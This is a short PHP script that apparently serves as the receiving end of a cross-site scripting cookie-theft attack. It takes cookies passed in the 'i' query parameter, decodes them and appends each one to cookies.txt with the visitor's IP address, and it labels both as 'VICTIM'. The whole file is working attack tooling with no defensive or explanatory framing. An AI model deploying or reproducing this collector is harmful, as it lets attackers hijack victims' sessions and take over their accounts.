<?php

// take the value of the parameter 'i' with the GET method
if(isset($_GET['i'])){

    // make a list with the cookies
    $list_cookies = explode(';', $_GET['i']);
    // a loop to collect the cookies and save them in 'cookies.txt'
    foreach ($list_cookies as $key => $value){
    
        // decode the cookie
        $cookie = urldecode($value);
    
        // save the in 'cookie.txt'
        $file = fopen("cookies.txt", "ar+");
        fputs($file, "VICTIM IP: {$_SERVER['REMOTE_ADDR']} | VICTIM COOKIE:{$cookie}<br>");
        fclose($file);
    };
};

?>

